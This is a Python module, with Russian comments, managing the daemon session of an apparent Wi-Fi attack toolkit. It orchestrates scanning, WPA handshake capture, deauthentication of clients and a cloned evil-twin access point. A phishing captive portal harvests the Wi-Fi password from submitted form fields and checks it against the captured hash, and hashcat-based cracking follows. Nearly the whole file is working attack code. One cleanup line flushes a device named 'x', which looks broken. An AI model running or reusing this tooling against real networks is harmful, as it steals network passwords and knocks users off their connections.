"""Состояние сессии демона и все операции над ним.

Один экземпляр на процесс. Мутирующие вызовы сериализуются локом, читающие —
нет. Никакой логики в обработчиках сокета: они только валидируют параметры.
"""

from __future__ import annotations

import os
import tempfile
import threading
import time
from pathlib import Path

from core import adapters as adapters_mod
from core import deps, link, mask, portal as portal_mod, project as project_mod, report
from core.ap import PORTAL_PORT, FakeAp
from core.base import (ResourceSet, WilfiError, atomic_write_json, read_json, require, run,
                       state_dir, which)
from core.capture import Capture
from core.crack import BUILTIN_MASKS, RULES_PRESETS, Crack
from core.deauth import Deauther
from core.jobs import JobRegistry
from core.scan import Ap, scan as scan_air
from core.verify import check_offline, check_online, guess_candidates

PENDING_FILE = "pending_rollback.json"


class Session:
    def __init__(self, owner_uid: int | None = None) -> None:
        self.owner_uid = owner_uid
        self.lock = threading.RLock()
        self.jobs = JobRegistry()
        self.project: project_mod.Project | None = None
        self.capture: Capture | None = None
        self.deauther: Deauther | None = None
        self.fakeap: FakeAp | None = None
        self.portal: portal_mod.Portal | None = None
        self.crack: Crack | None = None
        self.aps: dict[str, Ap] = {}
        self.probe_iface = ""
        self.ap_iface = ""
        self.extra_rollback: ResourceSet | None = None

    # ---------------------------------------------------------------- helpers
    def _require_project(self) -> project_mod.Project:
        if not self.project:
            raise WilfiError("проект не открыт", code="no_project")
        return self.project

    def _require_adapters(self) -> tuple[str, str]:
        adapters_mod.assert_distinct(self.probe_iface, self.ap_iface)
        return self.probe_iface, self.ap_iface

    def _target(self, bssid: str) -> Ap:
        ap = self.aps.get(bssid.lower())
        if not ap and self.project and self.project.target:
            t = self.project.target
            ap = Ap(bssid=t.bssid, ssid=t.ssid, channel=t.channel, band=t.band, pmf=t.pmf,
                    wpa2=t.wpa2, wpa3=t.wpa3, vendor=t.vendor, privacy=bool(t.wpa2 or t.wpa3))
        if not ap:
            raise WilfiError(f"точка {bssid} не найдена в результатах скана", code="no_target")
        return ap

    def _remember_target(self, ap: Ap) -> None:
        project = self._require_project()
        project.target = project_mod.Target(
            bssid=ap.bssid, ssid=ap.ssid, channel=ap.channel, band=ap.band,
            wpa2=ap.wpa2, wpa3=ap.wpa3, pmf=ap.pmf, vendor=ap.vendor,
        )
        project.save()

    # ----------------------------------------------------------------- system
    def ping(self) -> dict:
        return {"pong": True, "pid": __import__("os").getpid(), "root": __import__("os").geteuid() == 0}

    def recover_stale(self) -> dict:
        """Уборка после падения демона: правила nft, зависшие демоны, monitor-интерфейсы."""
        actions: list[str] = []
        nft = which("nft")
        if nft:
            res = run([nft, "delete", "table", "ip", "wifikit"], timeout=10)
            if res.ok:
                actions.append("снята таблица nft wifikit")
        pkill = which("pkill")
        if pkill:
            for pattern in ("hostapd", "dnsmasq.*wifikit", "hcxdumptool", "aireplay-ng"):
                res = run([pkill, "-f", pattern], timeout=10)
                if res.ok:
                    actions.append(f"остановлен {pattern}")
        for adapter in adapters_mod.list_adapters(include_all=True):
            try:
                if link.type_of(adapter.iface) == "monitor":
                    link.to_managed(adapter.iface)
                    actions.append(f"{adapter.iface} возвращён в managed")
                run([require("nmcli"), "device", "set", adapter.iface, "managed", "yes"], timeout=15)
            except WilfiError:
                continue
        run([require("ip"), "addr", "flush", "dev", "x"], timeout=5)
        return {"actions": actions}

    def deps_check(self) -> dict:
        return deps.check_all()

    def hashcat_devices(self) -> dict:
        if not self.crack:
            self.crack = Crack(self.jobs, Path("/tmp/wifikit-devices"))
        return self.crack.devices()

    def constants(self) -> dict:
        return {"rules": RULES_PRESETS, "masks": BUILTIN_MASKS, "portal_port": PORTAL_PORT}

    # --------------------------------------------------------------- adapters
    def adapters_list(self) -> dict:
        found = [a.summary() for a in adapters_mod.list_adapters(include_all=True)]
        return {
            "adapters": found,
            "probe_iface": self.probe_iface,
            "ap_iface": self.ap_iface,
        }

    def adapters_assign(self, role: str, iface: str) -> dict:
        other = self.ap_iface if role == "probe" else self.probe_iface
        if iface and iface == other:
            raise WilfiError(
                f"{iface} уже занят другой ролью",
                code="busy",
                detail="Сенсор и фейк-точка — разные физические адаптеры: один слушает эфир "
                       "на канале цели, второй вещает клон. Освободите роль, если хотите поменять.",
            )
        adapter = adapters_mod.get_adapter(iface) if iface else None
        if adapter:
            adapters_mod.ensure_capability(adapter, role)
        if role == "probe":
            self.probe_iface = iface
        elif role == "ap":
            self.ap_iface = iface
        else:
            raise WilfiError(f"неизвестная роль {role}")
        if self.project:
            self.project.probe_iface = self.probe_iface
            self.project.ap_iface = self.ap_iface
            self.project.save()
        return {"probe_iface": self.probe_iface, "ap_iface": self.ap_iface}

    def adapters_test(self, iface: str) -> dict:
        adapter = adapters_mod.get_adapter(iface)
        adapters_mod.ensure_capability(adapter, "probe")
        res: ResourceSet = ResourceSet("injection-test")
        previous = link.type_of(iface)
        try:
            if previous != "monitor":
                link.to_monitor(iface, res)
            return adapters_mod.test_injection(iface)
        finally:
            res.rollback()

    def rfkill_unblock(self) -> dict:
        res = run([require("rfkill"), "unblock", "wifi"], timeout=10)
        return {"ok": res.ok, "out": (res.out + res.err).strip()}

    # ------------------------------------------------------------------- scan
    def scan_start(self, seconds: float = 12.0, channels: list[int] | None = None) -> dict:
        if not self.probe_iface:
            raise WilfiError("не назначен адаптер-сенсор", code="no_adapter")
        adapter = adapters_mod.get_adapter(self.probe_iface)
        res = ResourceSet("scan")
        try:
            if link.type_of(self.probe_iface) != "managed":
                link.to_monitor(self.probe_iface, res)
                found = self._scan_monitor(seconds)
            else:
                link.unmanage(self.probe_iface, res)
                found = scan_air(self.probe_iface, seconds=seconds, channels=channels)
        finally:
            res.rollback()
        for ap in found:
            self.aps[ap.bssid] = ap
        return {"count": len(found), "aps": [a.summary() for a in sorted(found, key=lambda a: -a.rssi)]}

    def _scan_monitor(self, seconds: float) -> list[Ap]:
        """Если сенсор уже в monitor — пассивный скан через airodump."""
        from core.jobs import Job
        from core.scan import parse_airodump_csv

        airo = require("airodump-ng")
        with tempfile.TemporaryDirectory() as tmp:
            job = self.jobs.add(Job("airodump", [airo, "--output-format", "csv", "-w", f"{tmp}/scan",
                                                self.probe_iface], "пассивный скан"))
            time.sleep(min(max(6.0, seconds), 40.0))
            job.request_stop()
            time.sleep(0.6)
            csv_file = Path(f"{tmp}/scan-01.csv")
            if not csv_file.exists():
                return []
            return parse_airodump_csv(csv_file.read_text(errors="replace"))

    def scan_results(self) -> dict:
        return {"aps": [a.summary() for a in sorted(self.aps.values(), key=lambda a: -a.rssi)]}

    # ---------------------------------------------------------------- capture
    def capture_start(self, bssid: str, mode: str = "handshake", minutes: float = 5.0) -> dict:
        project = self._require_project()
        if not self.probe_iface:
            raise WilfiError("не назначен адаптер-сенсор", code="no_adapter")
        adapter = adapters_mod.get_adapter(self.probe_iface)
        adapters_mod.ensure_capability(adapter, "probe")
        ap = self._target(bssid)
        self._remember_target(ap)
        if not self.capture:
            self.capture = Capture(self.jobs, self.probe_iface, project.dump_dir)
        self.capture.iface = self.probe_iface
        data = self.capture.start(ap, mode=mode, minutes=minutes)
        project.notes.append(f"{time.strftime('%H:%M')} захват {mode} по {ap.bssid}")
        project.save()
        return data

    def capture_status(self) -> dict:
        if not self.capture:
            return {"job": None, "result": None, "elapsed": 0}
        return self.capture.status()

    def capture_stop(self) -> dict:
        if not self.capture:
            return {"job": None, "result": None, "elapsed": 0}
        return self.capture.stop()

    # ----------------------------------------------------------------- deauth
    def deauth_start(self, bssid: str, client: str | None = None, burst: int = 8, interval: float = 2.5) -> dict:
        if not self.probe_iface:
            raise WilfiError("не назначен адаптер-сенсор", code="no_adapter")
        ap = self._target(bssid)
        if not self.deauther:
            self.deauther = Deauther(self.probe_iface)
        self.deauther.iface = self.probe_iface
        monitor_ready = link.type_of(self.probe_iface) == "monitor" and bool(
            self.capture and self.capture.job and self.capture.job.state == "running")
        return self.deauther.start(ap, client=client, burst=burst, interval=interval, monitor_ready=monitor_ready)

    def deauth_stop(self) -> dict:
        if not self.deauther:
            return {"running": False, "bursts": 0}
        return self.deauther.stop()

    def deauth_status(self) -> dict:
        return self.deauther.status() if self.deauther else {"running": False, "bursts": 0}

    # --------------------------------------------------------------------- ap
    def ap_start(self, bssid: str, clone_bssid: bool = True) -> dict:
        project = self._require_project()
        if not self.ap_iface:
            raise WilfiError("не назначен адаптер для фейк-точки", code="no_adapter")
        adapter = adapters_mod.get_adapter(self.ap_iface)
        adapters_mod.ensure_capability(adapter, "ap")
        ap = self._target(bssid)
        self._remember_target(ap)
        if not self.fakeap:
            self.fakeap = FakeAp(self.jobs, self.ap_iface, project.ap_dir)
        self.fakeap.iface = self.ap_iface
        data = self.fakeap.start(ap, clone_bssid=clone_bssid)
        project.notes.append(f"{time.strftime('%H:%M')} фейк-точка поднята на {self.ap_iface}")
        project.save()
        return data

    def ap_stop(self) -> dict:
        if self.portal:
            portal_mod.stop(self.portal)
        if not self.fakeap:
            return {"running": False}
        return self.fakeap.stop()

    def ap_status(self) -> dict:
        return self.fakeap.status() if self.fakeap else {"running": False, "clients": []}

    # ----------------------------------------------------------------- portal
    def portal_templates(self) -> dict:
        return {"templates": portal_mod.list_templates()}

    def portal_install(self, path: str, name: str) -> dict:
        return portal_mod.install_custom(Path(path), name)

    def portal_start(self, template_id: str, verify: bool = True) -> dict:
        project = self._require_project()
        if not self.fakeap or not self.fakeap.running:
            raise WilfiError("сначала поднимите фейк-точку", code="no_ap")
        target = project.target
        self.portal = portal_mod.Portal(
            template_id,
            ssid=target.ssid if target else "WiFi",
            vendor=target.vendor if target else "",
            lang="ru",
        )
        if verify:
            self.portal.verifier = self._verify_submission
        portal_mod.serve(self.portal, "192.168.77.1", PORTAL_PORT)
        project.portal_template = template_id
        project.save()
        return self.portal.summary()

    def _verify_submission(self, fields: dict) -> str:
        candidate = _pick_password(fields)
        project = self._require_project()
        if not candidate:
            return "pending"
        project.notes.append(f"{time.strftime('%H:%M')} портал: кандидат «{candidate}»")
        if not project.target:
            project.save()
            return "pending"
        hash_file = self._latest_hash()
        if hash_file:
            try:
                verdict = check_offline(hash_file, candidate)
            except WilfiError as exc:
                verdict = {"ok": False, "reason": f"проверка не удалась: {exc}"}
            project.notes.append(f"  оффлайн-проверка: {verdict['reason']}")
            if verdict.get("unavailable"):
                # инструмент проверки отсутствует — не врём ни «верно», ни «неверно»
                project.save()
                return "pending"
            if verdict["ok"]:
                project.password = candidate
                project.save()
                return "ok"
            project.save()
            return "retry" if len(fields) > 0 else "pending"
        project.save()
        return "pending"

    def _latest_hash(self) -> Path | None:
        project = self._require_project()
        files = sorted(project.hash_dir.glob("*.hc22000"), key=lambda p: p.stat().st_mtime, reverse=True)
        for f in files:
            if f.stat().st_size > 0:
                return f
        return None

    def portal_status(self) -> dict:
        return self.portal.summary() if self.portal else {"template": None, "submissions": []}

    def portal_stop(self) -> dict:
        if self.portal:
            portal_mod.stop(self.portal)
            self.portal = None
        return {"stopped": True}

    # ----------------------------------------------------------------- crack
    def mask_preview(self, positions: list[dict], length_min: int | None = None,
                     length_max: int | None = None) -> dict:
        return mask.build(positions or [], length_min, length_max).summary()

    def crack_start(self, attack: str, wordlist: str | None = None, rules: str | None = None,
                    mask_raw: str | None = None, positions: list[dict] | None = None,
                    length_min: int | None = None, length_max: int | None = None,
                    custom_charset: str | None = None, runtime: int | None = None) -> dict:
        project = self._require_project()
        hash_file = self._latest_hash()
        if not hash_file:
            raise WilfiError("нет захваченного хэша", code="no_hash")
        if not self.crack:
            self.crack = Crack(self.jobs, project.path)
        spec = None
        if attack == "positions":
            spec = mask.build(positions or [], length_min, length_max)
            project.notes.append(
                f"{time.strftime('%H:%M')} маска {spec.mask} (длина {spec.length_min}-{spec.length_max}, "
                f"перебор {mask.human_keyspace(spec.keyspace)})")
            project.save()
        return self.crack.start(
            hash_file, attack,
            wordlist=Path(wordlist) if wordlist else None,
            rules=rules, mask=mask_raw, custom_charset=custom_charset,
            runtime=runtime, mask_spec=spec,
        )

    def crack_status(self) -> dict:
        return self.crack.status() if self.crack else {"running": False, "found": [], "progress": 0}

    def crack_stop(self) -> dict:
        return self.crack.stop() if self.crack else {"running": False}

    def candidates(self, extras: list[str] | None = None) -> dict:
        project = self._require_project()
        if not project.target:
            raise WilfiError("нет цели", code="no_target")
        lines = guess_candidates(project.target.ssid, project.target.bssid, extras)
        path = project.hash_dir / "candidates.txt"
        path.write_text("\n".join(lines) + "\n")
        return {"count": len(lines), "path": str(path)}

    def verify_password(self, password: str, online: bool = False) -> dict:
        project = self._require_project()
        hash_file = self._latest_hash()
        if hash_file:
            res = check_offline(hash_file, password)
        else:
            res = {"ok": False, "reason": "нет хэша для оффлайн-проверки"}
        if online and project.target:
            iface = project.ap_iface if self.fakeap and self.fakeap.running else self.probe_iface
            try:
                res["online"] = check_online(iface, project.target.ssid, password)
            except WilfiError as exc:
                res["online"] = {"ok": False, "reason": str(exc)}
        if res.get("ok"):
            project.password = password
            project.save()
        return res

    # ---------------------------------------------------------------- project
    def _claim(self, path: Path) -> None:
        """Отдать каталог пользователю GUI: демон работает от root и иначе всё root-овое."""
        if self.owner_uid is None:
            return
        for item in [path, *path.rglob("*")]:
            try:
                os.chown(item, self.owner_uid, self.owner_uid)
            except OSError:
                continue

    def project_new(self, name: str, base: str | None = None) -> dict:
        self._reset_runtime()
        root = Path(base).expanduser() if base else None
        self.project = project_mod.new(name, base=root)
        self._claim(self.project.path)
        self.project.save()
        self._claim(self.project.path)
        return self.project.summary()

    def project_open(self, path: str) -> dict:
        self._reset_runtime()
        self.project = project_mod.open_project(path)
        self.probe_iface = self.project.probe_iface
        self.ap_iface = self.project.ap_iface
        return self.project.summary()

    def project_list(self, base: str | None = None) -> dict:
        root = Path(base).expanduser() if base else None
        return {"projects": project_mod.list_projects(base=root)}

    def project_get(self) -> dict:
        return self.project.as_dict() if self.project else {"name": None}

    def project_note(self, text: str) -> dict:
        project = self._require_project()
        project.notes.append(text)
        project.save()
        return {"notes": project.notes}

    def report_export(self, fmt: str = "md") -> dict:
        project = self._require_project()
        extra = {
            "шаблон портала": project.portal_template or "—",
            "попыток ввода в портале": str(len(self.portal.submissions) if self.portal else 0),
        }
        path = report.export(project, fmt, extra)
        self._claim(project.path)
        return {"path": str(path)}

    def _reset_runtime(self) -> None:
        if self.portal:
            portal_mod.stop(self.portal)
        self.portal = None
        if self.fakeap:
            self.fakeap.stop()
        self.fakeap = None
        if self.deauther:
            self.deauther.stop()
        self.deauther = None
        if self.capture:
            self.capture.cleanup()
        self.capture = None
        self.aps.clear()

    # ------------------------------------------------------------------ state
    def snapshot(self) -> dict:
        return {
            "project": self.project.summary() if self.project else None,
            "adapters": self.adapters_list(),
            "capture": self.capture_status(),
            "deauth": self.deauth_status(),
            "ap": self.ap_status(),
            "portal": self.portal_status(),
            "crack": self.crack_status(),
            "deps": deps.check_all(),
        }

    def shutdown(self) -> dict:
        self._reset_runtime()
        self.jobs.stop_all()
        problems = []
        pending = read_json(state_dir() / PENDING_FILE)
        if pending:
            problems.append("незакрытый откат с прошлого запуска")
        atomic_write_json(state_dir() / PENDING_FILE, {"at": time.time(), "reason": "shutdown"})
        return {"stopped": True, "problems": problems}


def _pick_password(fields: dict[str, str]) -> str | None:
    """Ищем пароль среди полей: сначала явные имена, потом значения любой длины."""
    lowered = {k.lower(): v for k, v in fields.items()}
    for key in ("password", "pass", "passwd", "psk", "wifi_password", "wpapsk"):
        if lowered.get(key):
            return lowered[key]
    for key, value in lowered.items():
        if "pass" in key and value:
            return value
    for value in lowered.values():
        if value and 8 <= len(value) <= 63:
            return value
    return None
